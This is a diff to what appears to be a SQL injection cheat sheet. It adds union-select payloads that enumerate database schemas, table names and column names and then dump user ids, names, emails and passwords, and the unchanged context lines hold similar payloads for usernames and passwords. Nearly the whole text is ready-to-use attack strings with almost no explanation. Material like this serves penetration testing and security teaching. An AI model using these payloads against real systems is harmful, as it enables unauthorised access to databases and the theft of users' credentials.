@@ -29,6 +29,11 @@ Until error occurs, then:
 =1 union all select 1, 2, 3...
 =1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
 =1 union all select 1, username, password from users
+
+' union select 1,2,3,concat(schema_name, ':') from information_schema.schemata-- -    # db name
+' union select 1,2,3,concat(table_name, ':') from information_schema.tables where table_schema = '[DB_NAME]'-- -   # table name
+' union select 1,2,3,concat(column_name, ':') from information_schema.columns where table_name = '[TABLE_NAME]'-- -   # column name
+' union select 1,2,3,concat(id, ':', name, ':', email, ':', password) from user-- -   # column content
 ```
 
 ### Simple SQL injection test
